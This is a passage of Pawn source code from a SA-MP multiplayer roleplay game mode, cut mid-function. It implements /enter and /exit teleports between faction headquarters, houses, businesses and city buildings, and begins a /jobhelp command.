            if (PlayerToPoint(2, playerid, 2232.425537,-1159.585205,25.890625))
            {
	     if(PlayerInfo[playerid][pClan] == 1)// TT entrance
        {
			    SetPlayerVirtualWorld(playerid, 10001);
                SetPlayerPosEx(playerid, 225.938522,1023.249267,1084.012451);
                SetPlayerInterior(playerid, 7);
                Mahal[playerid] = 212;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                GameTextForPlayer(playerid, "~r~JG Clan ~y~Family ~g~HQ",5000,1);
                return 1;
            }
        else { return 1; }
        }
            if (PlayerToPoint(2, playerid, 2140.929199,-1801.968017,16.147472))
            {
	     if(PlayerInfo[playerid][pClan] == 3)// EVIL entrance
        {
			    SetPlayerVirtualWorld(playerid, 10003);
                SetPlayerPosEx(playerid, 1702.380859,-1668.129882,20.218750);
                SetPlayerInterior(playerid, 18);
                Mahal[playerid] = 2145;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                GameTextForPlayer(playerid, "~r~Evil Clan ~y~Family ~g~HQ",5000,1);
                return 1;
            }
        else { return 1; }
        }
		 if (PlayerToPoint(2, playerid, 1653.836059,-1654.757690,22.515625))
            {
	     if(PlayerInfo[playerid][pClan] == 2)// GG entrance (Edit)
        {
				SetPlayerVirtualWorld(playerid, 10002);
                SetPlayerPosEx(playerid, 1702.380859,-1668.129882,20.218750);
                SetPlayerInterior(playerid, 18);
                Mahal[playerid] = 357;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                GameTextForPlayer(playerid, "~r~GG Clan ~y~Family ~g~HQ",5000,1);
                return 1;
            }
            else { return 1; }
        }

for(new house = 0; house < sizeof(HouseInfo); house++)
        {
if (PlayerToPoint(2.0, playerid,HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]))
            {
                if(PlayerInfo[playerid][pPhousekey] == house || HouseInfo[house][hLock] == 0)
                {
                    SetPlayerInterior(playerid,HouseInfo[house][hInt]);
                    SetPlayerVirtualWorld(playerid,HouseInfo[house][hWorld]);
                    SetPlayerPosEx(playerid,HouseInfo[house][hEntrancex],HouseInfo[house][hEntrancey],HouseInfo[house][hEntrancez]);
                    Mahal[playerid] = 3;
                    TooHouse[playerid] = house;
                    TooBiz[playerid] = 9999;
                }
                else
                {
                    GameTextForPlayer(playerid, "~r~Locked", 5000, 3);
                }
                }
            }
        if (PlayerToPoint(2, playerid, 1554.9100,-1675.6428,16.1953))//LSPD
        {
            SetPlayerPosEx(playerid,246.5325,62.4251,1003.6406);
            SetPlayerInterior(playerid,6);
            GameTextForPlayer(playerid, "~w~Police Departament", 1000, 1);
            Mahal[playerid] = 5;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if (PlayerToPoint(2, playerid, 2287.0576,2432.1121,10.8203))//FBI
        {
            SetPlayerPosEx(playerid,288.7609,168.6815,1007.1719);
            SetPlayerInterior(playerid,3);
            Mahal[playerid] = 6;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            GameTextForPlayer(playerid, "~w~ Federal Bureau of Investigation", 1000, 1);
            return 1;
        }
        else if(PTP(2, playerid, 1570.3828,-1333.8882,16.4844))
        {
            SetPlayerPosEx(playerid,1541.300170,-1360.734619,329.460815)
            GameTextForPlayer(playerid, "~r~LS~n~Tower!", 1000, 1);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if (PlayerToPoint(2, playerid, 1481.0289,-1770.9703,18.7958))//LS City Hall
        {
            SetPlayerVirtualWorld(playerid, 55);
            SetPlayerPosEx(playerid,386.5196,173.6847,1008.3828);
            SetPlayerInterior(playerid,3);
            Mahal[playerid] = 4;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            GameTextForPlayer(playerid, "~w~Los Santos ~b~City Hall", 1000, 1);
            return 1;
        }
        else if (PlayerToPoint(5.0, playerid, 305.3564,-141.8755,1004.0625))//GSLS
        {
            SetPlayerPosEx(playerid,303.9991,-141.7700,1004.0625);
            SetPlayerInterior(playerid,7);
            return 1
        }
        else if (PlayerToPoint(2, playerid, 300.1706,-141.8950,1004.0625))//GSLS
        {
            SetPlayerPosEx(playerid,298.5961,-141.8859,1004.0547);
            SetPlayerInterior(playerid,7);
            return 1
        }
        else if (PlayerToPoint(2, playerid, 301.7390,-77.3810,1001.5156))//GSLV
        {
            SetPlayerPosEx(playerid,301.6781,-74.9160,1001.5156);
            SetPlayerInterior(playerid,4);
            return 1
        }
        else if (PlayerToPoint(2, playerid, 302.9118,-57.6741,1001.5156))//GSLV
        {
            SetPlayerPosEx(playerid,304.5474,-57.6247,1001.5156);
            SetPlayerInterior(playerid,4);
            return 1
        }
        else if(PTP(2,playerid,1797.442504,-1578.950683,14.085444))//JAil LS
        {
            SetPlayerPosEx(playerid,1802.142822,-1553.456665,2001.300415);
            SetPlayerVirtualWorld(playerid,10);
            SetPlayerFacingAngle(playerid,90);
            SetPlayerInterior(playerid, 1);
            Mahal[playerid] = 2;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }

        else if(PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pLeader] == 15)// StormMen entrance
        {
            if (PlayerToPoint(5, playerid, 2792.930175,-1087.530761,30.718750))
            {
					SetPlayerPos(playerid ,1298.830810,-795.336669,1084.007812);
					SetPlayerVirtualWorld(playerid, 40015);
					SetPlayerInterior(playerid, 5);
					Mahal[playerid] = 11;
					TooHouse[playerid] = 9999;
					TooBiz[playerid] = 9999;
                return 1;
            }
            else { return 1; }
        }

        else if(PlayerInfo[playerid][pMember] == 19 || PlayerInfo[playerid][pLeader] == 19)// StormMen entrance
        {
            if (PlayerToPoint(5, playerid, -2720.359619,-318.036743,7.843750))
            {
                SetPlayerPosEx(playerid ,1298.905,-796.0, 1084.0);
                SetPlayerInterior(playerid, 5);
                GameTextForPlayer(playerid, "~r~The Racers ~y~Family ~g~HQ",5000,1);
                Mahal[playerid] = 214;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                return 1;
            }
            else { return 1; }
        }
        else if(PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12)// Dangerous Tigers entrance
        {
				if (PlayerToPoint(2, playerid, 2637.1936,2352.0090,10.8203))
				{
					SetPlayerPos(playerid, 1298.830810,-795.336669,1084.007812);
					SetPlayerVirtualWorld(playerid, 40012);
					SetPlayerInterior(playerid, 5);
					Mahal[playerid] = 12;
					TooHouse[playerid] = 9999;
					TooBiz[playerid] = 9999;
					return 1;
            }
            else { return 1; }
        }
        else if(PTP(5,playerid,1769.327392,-1542.691162,2001.300415) && GetPlayerVirtualWorld(playerid) == 10)//Jail /enter too
        {
            if(IsACop(playerid))
            {
                SetPlayerPosEx(playerid,1767.936523,-1542.816650,2001.300415);
                return 1;
            }
            else return SCM(playerid,COLOR_BLUE,"You are not a Cop.");
        }
        else if(PlayerInfo[playerid][pMember] == 14 || PlayerInfo[playerid][pLeader] == 14)// FNF entrance
        {
            if (PlayerToPoint(2, playerid, 1455.4546,750.9794,11.0234))
            {
                SetPlayerPosEx(playerid, 1298.905,-796.0, 1084.0);
                SetPlayerInterior(playerid, 5);
                SetPlayerVirtualWorld(playerid, 62);
                Mahal[playerid] = 8;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                GameTextForPlayer(playerid, "~r~Fast N Furious ~y~Family ~g~HQ",5000,1);
                return 1;
            }
            else { return 1; }
        }
        else if(PlayerInfo[playerid][pMember] == 13 || PlayerInfo[playerid][pLeader] == 13)// LegendaryMen entrance
        {
				if (PlayerToPoint(2, playerid, 1122.7065,-2037.0063,69.8942))
				{
					SetPlayerPos(playerid, 1298.830810,-795.336669,1084.007812);
					SetPlayerInterior(playerid, 5);
					SetPlayerVirtualWorld(playerid, 40013);
					Mahal[playerid] = 13;
					TooHouse[playerid] = 9999;
					TooBiz[playerid] = 9999;
                return 1;
            }
            else { return 1; }
        }
        else if(PlayerInfo[playerid][pMember] == 17 || PlayerInfo[playerid][pLeader] == 17)// Staff entrance
        {
            if (PlayerToPoint(2, playerid, 2560.805175,1561.846069,10.820312))
            {
                SetPlayerPosEx(playerid, 225.776153,1023.474426,1084.011840);
                SetPlayerInterior(playerid, 7);
                SetPlayerVirtualWorld(playerid, 934);
                Mahal[playerid] = 199;
                TooHouse[playerid] = 934;
                TooBiz[playerid] = 9999;
                GameTextForPlayer(playerid, "~r~Staff ~y~Family ~g~HQ",5000,1);
                return 1;
            }
            else { return 1; }
        }
			else if(PlayerInfo[playerid][pMember] == 5 || PlayerInfo[playerid][pLeader] == 5)// Da Nang Boys entrance
			{
				if (PlayerToPoint(2, playerid,725.5550,-1451.0232,17.6953))
				{
					SetPlayerPos(playerid, 1298.830810,-795.336669,1084.007812);
					SetPlayerInterior(playerid, 5);
					SetPlayerVirtualWorld(playerid, 4005);
					Mahal[playerid] = 7;
					TooHouse[playerid] = 9999;
					TooBiz[playerid] = 9999;
					GameTextForPlayer(playerid, "~r~Da Nang Boys ~y~Family ~g~HQ",5000,1);
					return 1;
				}
				else { return 1; }
			}
			else if(PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pLeader] == 6)// Triads entrance
			{
				if (PlayerToPoint(2, playerid,1456.7424,2773.4614,10.8203))
				{
					SetPlayerPos(playerid, 1298.830810,-795.336669,1084.007812);
					SetPlayerInterior(playerid, 5);
					SetPlayerVirtualWorld(playerid, 4006);
					Mahal[playerid] = 9;
					TooHouse[playerid] = 9999;
					TooBiz[playerid] = 9999;
					return 1;
				}
				else { return 1; }
			}
        else if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8)// Hitman entrance
        {
            if (PlayerToPoint(2, playerid,1080.997192,-345.408233,73.984069))
            {
                SetPlayerPosEx(playerid, 1701.744262,-1667.856689,20.218750);
                SetPlayerVirtualWorld(playerid, 54);
                SetPlayerInterior(playerid, 18);
                GameTextForPlayer(playerid, "~r~Hitman ~y~Agency ~g~HQ",5000,1);
                Mahal[playerid] = 10;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                return 1;
                }
                else { return 1; }
        }
        else if (PlayerToPoint(5, playerid,2802.8596,2430.6089,11.0625))//VICTIM LV
        {
            SetPlayerPosEx(playerid, 226.293991,-7.431529,1002.210937);
            SetPlayerVirtualWorld(playerid, 67);
            SetPlayerInterior(playerid, 5);
            GameTextForPlayer(playerid, "~r~Welcome ~y~to ~b~Victim",5000,1);
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if(PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pLeader] == 10)// Taxi entrance LAS Venturas
        {
            if (PlayerToPoint(5, playerid,937.3935,1733.2067,8.8516))
            {
                SetPlayerPosEx(playerid, 1494.325195,1304.942871,1093.289062);
                SetPlayerInterior(playerid, 3);
                SetPlayerVirtualWorld(playerid, 70);
                GameTextForPlayer(playerid, "~w~Taxi Cab Company ~g~HQ",5000,1);
                Mahal[playerid] = 14;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                return 1;
            }
            else { return 1; }
        }
        else if(PlayerInfo[playerid][pMember] == 4 || PINFO[playerid][pLeader] == 4)
        {
           if(PTP(5,playerid,1607.520996,1815.756591,10.820312))
           {
           SetPlayerPosEx(playerid,1494.325195,1304.942871,1093.289062);
           SetPlayerInterior(playerid,3);
           SetPlayerVirtualWorld(playerid,71);
           GameTextForPlayer(playerid,"~r~Welcome to HQ",5000,1);
           Mahal[playerid] = 70;
           TooHouse[playerid] = 9999;
           TooBiz[playerid] = 9999;
           return 1;
           }
           else { return 1; }
        }
        else if(PINFO[playerid][pMember] == 9 || PINFO[playerid][pLeader] == 9)
        {
            if(PTP(5,playerid,-329.770111,1536.920532,76.611709))
            {
                SetPlayerPosEx(playerid,1494.325195,1304.942871,1093.289062);
                SetPlayerInterior(playerid,3);
                SetPlayerVirtualWorld(playerid,72);
                GameTextForPlayer(playerid,"~w~Welcome to ~r~HQ",5000,1);
                Mahal[playerid] = 71;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                return 1;
            }
            else return 1;
        }
else
{
return 1;
}


        }
}
//--------------------------*** EXIT ***------------------------------------------------
         if(strcmp(cmd, "/exit", true) == 0)
        {
        if(PlayerInfo[playerid][pJailTime] >= 1)
        {
        SCM(playerid,COLOR_YELLOW,"When You are in Jail You can't use /exit.");
        return 1;
        }
if(IsPlayerConnected(playerid))
{
for(new bizid = 0; bizid < sizeof(BizzInfo); bizid++)
        {
if (GetPlayerVirtualWorld(playerid) == BizzInfo[bizid][bVW] && PlayerToPoint(4.0, playerid,BizzInfo[bizid][bExitX],BizzInfo[bizid][bExitY],BizzInfo[bizid][bExitZ]))
            {
                SetPlayerInterior(playerid,0);
                SetPlayerPosEx(playerid,BizzInfo[bizid][bEntranceX],BizzInfo[bizid][bEntranceY],BizzInfo[bizid][bEntranceZ]);
                Mahal[playerid] = 9999;
                TooBiz[playerid] = 9999;
                TooHouse[playerid] = 9999;
                SetPlayerVirtualWorld(playerid,0);
                return 1;
            }
}

for(new house = 0; house < sizeof(HouseInfo); house++)
    {
if (PlayerToPoint(4.0, playerid,HouseInfo[house][hEntrancex],HouseInfo[house][hEntrancey],HouseInfo[house][hEntrancez]) && (HouseInfo[house][hWorld] == GetPlayerVirtualWorld(playerid)))
            {
                SetPlayerInterior(playerid,0);
                SetPlayerVirtualWorld(playerid,0);
                SetPlayerPosEx(playerid,HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]);
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                return 1;
            }
    }
        if (PlayerToPoint(5.0, playerid, -103.559165,-24.225606,1000.718750))
        {
            SetPlayerPosEx(playerid, 2085.1194,2074.0383,11.0547);
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
            GameTextForPlayer(playerid, "~w~Las Venturas", 1000, 1);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if(PlayerToPoint(5.0, playerid, 246.5325,62.4251,1003.6406))//LSPD
        {
            SetPlayerPosEx(playerid, 1554.9100,-1675.6428,16.1953);
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
             GameTextForPlayer(playerid, "~w~Los Santos", 1000, 1);
             Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
             return 1;
        }
        else if(PTP(5.0, playerid, 1541.300170,-1360.734619,329.460815))
        {
            SetPlayerPosEx(playerid, 1570.3828,-1333.8882,16.4844);
            GameTextForPlayer(playerid, "~w~Los Santos", 1000, 1);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if (PlayerToPoint(5, playerid, 288.7609,168.6815,1007.1719))//FBI
        {
            SetPlayerPosEx(playerid, 2287.0576,2432.1121,10.8203);
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
            GameTextForPlayer(playerid, "~w~Las Venturas", 1000, 1);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if (PlayerToPoint(5, playerid, 386.5196,173.6847,1008.3828) && GetPlayerVirtualWorld(playerid) == 55)//LS City Hall
        {
            SetPlayerPosEx(playerid, 1481.0289,-1770.9703,18.7958);
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
             GameTextForPlayer(playerid, "~w~Los Santos", 1000, 1);
             Mahal[playerid] = 9999;
             TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
             return 1;
        }
        else if(PTP(5,playerid,1767.936523,-1542.816650,2001.300415) && GetPlayerVirtualWorld(playerid) == 10)
        {
            if(IsACop(playerid))
            {
                SetPlayerPosEx(playerid,1769.327392,-1542.691162,2001.300415);
                return 1;
            }
            else return SCM(playerid,COLOR_BLUE,"You are not a Cop.");
        }
        else if(PTP(5,playerid,1802.142822,-1553.456665,2001.300415) && GetPlayerVirtualWorld(playerid) == 10)
        {
            SetPlayerPosEx(playerid,1797.442504,-1578.950683,14.085444);
            SetPlayerVirtualWorld(playerid,0);
            SetPlayerInterior(playerid, 0);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if (PlayerToPoint(5, playerid, 6.091179,-29.271898,1003.549438) && GetPlayerVirtualWorld(playerid) == 13)//24/7 LV
        {
            SetPlayerPosEx(playerid, 2097.4456,2224.2317,11.0234);
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
            GameTextForPlayer(playerid, "~w~Las Venturas", 1000, 1);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if (PlayerToPoint(5, playerid, 6.091179,-29.271898,1003.549438) && GetPlayerVirtualWorld(playerid) == 14)//24/7 LV
        {
            SetPlayerPosEx(playerid, 2637.1113,1129.2675,11.1797);
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
            GameTextForPlayer(playerid, "~w~Las Venturas", 1000, 1);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if (PlayerToPoint(2, playerid, 303.9991,-141.7700,1004.0625))//GSLS
        {
            SetPlayerPosEx(playerid, 305.3564,-141.8755,1004.0625);
            SetPlayerInterior(playerid, 7);
            SetPlayerVirtualWorld(playerid, 0);
            return 1;
        }
        else if (PlayerToPoint(2, playerid, 298.5961,-141.8859,1004.0547))//GSLS
        {
            SetPlayerPosEx(playerid, 300.1706,-141.8950,1004.0625);
            SetPlayerInterior(playerid, 7);
            SetPlayerVirtualWorld(playerid, 0);
            return 1;
        }
        else if (PlayerToPoint(2, playerid, 301.6781,-74.9160,1001.5156))//GSLV
        {
            SetPlayerPosEx(playerid, 301.7390,-77.3810,1001.5156);
            SetPlayerInterior(playerid, 4);
            SetPlayerVirtualWorld(playerid, 0);
            return 1;
        }
        else if (PlayerToPoint(2, playerid, 304.5474,-57.6247,1001.5156))//GSLV
        {
            SetPlayerPosEx(playerid, 302.9118,-57.6741,1001.5156);
            SetPlayerInterior(playerid, 4);
            SetPlayerVirtualWorld(playerid, 0);
            return 1;
        }
         else if (PlayerToPoint(5, playerid, -27.312299,-29.277599,1003.557250) && GetPlayerVirtualWorld(playerid) == 23)//24/7 5 LS
         {
                SetPlayerPosEx(playerid, -78.5365,-1169.9178,2.1389);
                SetPlayerInterior(playerid, 0);
                SetPlayerVirtualWorld(playerid, 0);
                GameTextForPlayer(playerid, "~w~Los Santos", 5000, 1);
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                return 1;
         }
         else if (PlayerToPoint(5, playerid, -27.312299,-29.277599,1003.557250) && GetPlayerVirtualWorld(playerid) == 24)//24/7 6
         {
                SetPlayerPosEx(playerid, 762.7137,-1792.9973,13.0234);
                SetPlayerInterior(playerid, 0);
                SetPlayerVirtualWorld(playerid, 0);
                GameTextForPlayer(playerid, "~w~Los Santos", 5000, 1);
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
                return 1;
         }
			else if (PlayerToPoint(10.0, playerid,1298.830810,-795.336669,1084.007812) && GetPlayerVirtualWorld(playerid) == 40015)//VLA HQ
				{

					SetPlayerInterior(playerid,0);
					SetPlayerPos(playerid,2792.930175,-1087.530761,30.718750);
					Mahal[playerid] = 9999;
					TooHouse[playerid] = 9999;
					TooBiz[playerid] = 9999;
					SetPlayerVirtualWorld(playerid, 0);
					return 1;
				}

			else if (PlayerToPoint(5, playerid, 1298.830810,-795.336669,1084.007812) && GetPlayerVirtualWorld(playerid) == 40012) // Grove Street Exit
			{
				SetPlayerPos(playerid, 2637.1936,2352.0090,10.8203);
				SetPlayerInterior(playerid, 0);
				GameTextForPlayer(playerid, "~r~Las ~g~Venturas",5000,1);
				Mahal[playerid] = 9999;
				TooHouse[playerid] = 9999;
				TooBiz[playerid] = 9999;
				SetPlayerVirtualWorld(playerid, 0);
				return 1;
			}
        else if(PlayerToPoint(5.0, playerid,1298.905,-796.0, 1084.0) && GetPlayerVirtualWorld(playerid) == 62) // FNF Exit
        {
            SetPlayerPosEx(playerid, 1455.4546,750.9794,11.0234);
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
            GameTextForPlayer(playerid, "~r~Las ~g~Venturas",5000,1);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if(PlayerToPoint(5.0, playerid,1298.905,-796.0, 1084.0) && GetPlayerVirtualWorld(playerid) == 100074) // FNF Exit
        {
            SetPlayerPosEx(playerid, -1592.815551,716.191406,-5.242187);
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
            GameTextForPlayer(playerid, "~r~San ~g~Fiero",5000,1);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
			else if (PlayerToPoint(8.0, playerid,1298.830810,-795.336669,1084.007812) && GetPlayerVirtualWorld(playerid) == 40013)//Vagos HQ
				{
					SetPlayerInterior(playerid,0);
					SetPlayerPos(playerid,1122.7065,-2037.0063,69.8942);
					SetPlayerVirtualWorld(playerid, 0);
					Mahal[playerid] = 9999;
					TooHouse[playerid] = 9999;
					TooBiz[playerid] = 9999;
					SetPlayerVirtualWorld(playerid, 0);
                return 1;
            }
                    else if (PlayerToPoint(8.0, playerid,2560.805175,1561.846069,10.820312))//Staff HQ
            {
                SetPlayerInterior(playerid,7);
                SetPlayerPosEx(playerid,225.776153,1023.474426,1084.011840);
                Mahal[playerid] = 199;
                TooHouse[playerid] = 934;
            TooBiz[playerid] = 9999;
                SetPlayerVirtualWorld(playerid, 934);
                return 1;
            }
			else if (PlayerToPoint(5, playerid, 1298.830810,-795.336669,1084.007812) && GetPlayerVirtualWorld(playerid) == 4005) // Da Nang Boys Exit
			{
				SetPlayerPos(playerid,725.5550,-1451.0232,17.6953);
				SetPlayerInterior(playerid, 0);
				GameTextForPlayer(playerid, "~r~Los ~g~Santos",5000,1);
				SetPlayerVirtualWorld(playerid, 0);
				Mahal[playerid] = 9999;
				TooHouse[playerid] = 9999;
				TooBiz[playerid] = 9999;
				return 1;
			}
        else if (PlayerToPoint(5, playerid, 225.938522,1023.249267,1084.012451) && GetPlayerVirtualWorld(playerid) == 10001) // TT Exit
        {
            SetPlayerPosEx(playerid,2232.425537,-1159.585205,25.890625);
			SetPlayerVirtualWorld(playerid, 0);
            SetPlayerInterior(playerid, 0);
            GameTextForPlayer(playerid, "~r~Los ~g~Santos",5000,1);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }

			else if (PlayerToPoint(8.0, playerid,1298.830810,-795.336669,1084.007812) && GetPlayerVirtualWorld(playerid) == 4006)//Triads HQ
				{
					SetPlayerInterior(playerid,0);
					SetPlayerPos(playerid,1456.7424,2773.4614,10.8203);
					Mahal[playerid] = 9999;
					SetPlayerVirtualWorld(playerid, 0);
					TooHouse[playerid] = 9999;
					TooBiz[playerid] = 9999;
					return 1;
				}


        else if (PlayerToPoint(5, playerid, 1702.380859,-1668.129882,20.218750) && GetPlayerVirtualWorld(playerid) == 10002) // GG Exit (Edit)
        {
		    SetPlayerVirtualWorld(playerid, 0);
            SetPlayerPosEx(playerid,1653.836059,-1654.757690,22.515625);
            SetPlayerInterior(playerid, 0);
            GameTextForPlayer(playerid, "~r~Los ~g~Santos",5000,1);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if (PlayerToPoint(5, playerid, 1702.380859,-1668.129882,20.218750) && GetPlayerVirtualWorld(playerid) == 10003) // Evil Exit (Edit)
        {
		    SetPlayerVirtualWorld(playerid, 0);
            SetPlayerPosEx(playerid,2140.929199,-1801.968017,16.147472);
            SetPlayerInterior(playerid, 0);
            GameTextForPlayer(playerid, "~r~Los ~g~Santos",5000,1);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if (PlayerToPoint(8.0, playerid,1298.905,-796.0, 1084.0) && GetPlayerVirtualWorld(playerid) == 0)//The Killers HQ
            {
                SetPlayerInterior(playerid,0);
                SetPlayerPosEx(playerid,1456.7424,2773.4614,10.8203);
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
                return 1;
            }
        else if (PlayerToPoint(5, playerid, 1701.744262,-1667.856689,20.218750) && GetPlayerVirtualWorld(playerid) == 54) // Hitman Exit
        {
            SetPlayerPosEx(playerid,1080.997192,-345.408233,73.984069);
            SetPlayerVirtualWorld(playerid, 0);
            SetPlayerInterior(playerid, 0);
            GameTextForPlayer(playerid, "~r~Los ~g~Santos",5000,1);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if (PlayerToPoint(5, playerid, 226.293991,-7.431529,1002.210937) && GetPlayerVirtualWorld(playerid) == 67)//VICTIM LV
        {
            SetPlayerPosEx(playerid,2802.8596,2430.6089,11.0625);
            SetPlayerVirtualWorld(playerid, 0);
            SetPlayerInterior(playerid, 0);
            GameTextForPlayer(playerid, "~w~Las Venturas",5000,1);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if (PlayerToPoint(5, playerid, 1494.325195,1304.942871,1093.289062) && GetPlayerVirtualWorld(playerid) == 70) // TAXI LV Exit
        {
            SetPlayerPosEx(playerid, 937.3935,1733.2067,8.8516);
            SetPlayerInterior(playerid, 0);
            SetPlayerVirtualWorld(playerid, 0);
            GameTextForPlayer(playerid, "~r~Las ~g~Venturas",5000,1);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if(PTP(5,playerid,1494.325195,1304.942871,1093.289062) && GetPlayerVirtualWorld(playerid) == 71)
        {
        SetPlayerPosEx(playerid,1607.520996,1815.756591,10.820312);
        SetPlayerInterior(playerid,0);
        SetPlayerVirtualWorld(playerid,0);
        Mahal[playerid] = 9999;
        TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
        return 1;
        }
        else if(PTP(5,playerid,1494.325195,1304.942871,1093.289062) && GetPlayerVirtualWorld(playerid) == 72)
        {
            SetPlayerPosEx(playerid,-329.770111,1536.920532,76.611709);
            SetPlayerInterior(playerid,0);
            SetPlayerVirtualWorld(playerid,0);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if (PlayerToPoint(3.0, playerid,387.7978,173.8582,1008.3828))
        {
            SetPlayerInterior(playerid,0);
            SetPlayerPosEx(playerid,1481.0206,-1771.1138,18.7958);
            Mahal[playerid] = 9999;
            TooHouse[playerid] = 9999;
            TooBiz[playerid] = 9999;
            return 1;
        }
        else if (IsPlayerInAnyVehicle(playerid))
        {
            if(IsPlayerInAnyVehicle(playerid) && !engineOn[GetPlayerVehicleID(playerid)] && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
            {
                TogglePlayerControllable(playerid, 1);
                RemovePlayerFromVehicle(playerid);
            }
            if(GetPlayerVehicleID(playerid) >= 112 && GetPlayerVehicleID(playerid) <= 130 || GetPlayerVehicleID(playerid) >= 135 && GetPlayerVehicleID(playerid) <= 154)
            {
                TogglePlayerControllable(playerid, 1);
                RemovePlayerFromVehicle(playerid);
            }
        return 1;
        }
else
{
return 1;
}


    }

}
//----------------------------------[HELP]-----------------------------------------------" /live /news"
    if(strcmp(cmd, "/jobhelp", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pJob] == 1) {
            {
                SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                SendClientMessage(playerid, COLOR_WHITE,"*** HELP *** type a command for more help");
                SendClientMessage(playerid, COLOR_GRAD3,"*** JOB ***    /find, /cancel find"); }
            }
            else if(PlayerInfo[playerid][pJob] == 2) {
            {
                SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                SendClientMessage(playerid, COLOR_WHITE,"*** HELP *** type a command for more help");
                SendClientMessage(playerid,COLOR_GRAD3,"*** JOB *** /free, /accept approval"); }
            }
            else if(PlayerInfo[playerid][pJob] == 4) {
            {
                SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                SendClientMessage(playerid, COLOR_WHITE,"*** HELP *** type a command for more help");
                SendClientMessage(playerid,COLOR_GRAD3,"*** JOB *** /buydrugs"); }
            }
            else if(PlayerInfo[playerid][pJob] == 5) {
            {
                SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                SendClientMessage(playerid, COLOR_WHITE,"*** HELP *** type a command for more help");
                SendClientMessage(playerid,COLOR_GRAD3,"*** JOB *** /dropcar"); }
            }
            else if(PlayerInfo[playerid][pJob] == 7) {
            {
                SendClientMessage(playerid, CRISTIAN,"_______________________________________");
                SendClientMessage(playerid, COLOR_WHITE,"*** HELP *** type a command for more help");
                SendClientMessage(playerid,COLOR_GRAD3,"*** JOB *** /repair /refill /jobduty"); }
            }
            else if(PlayerInfo[playerid][pJob] == 9) {
            {
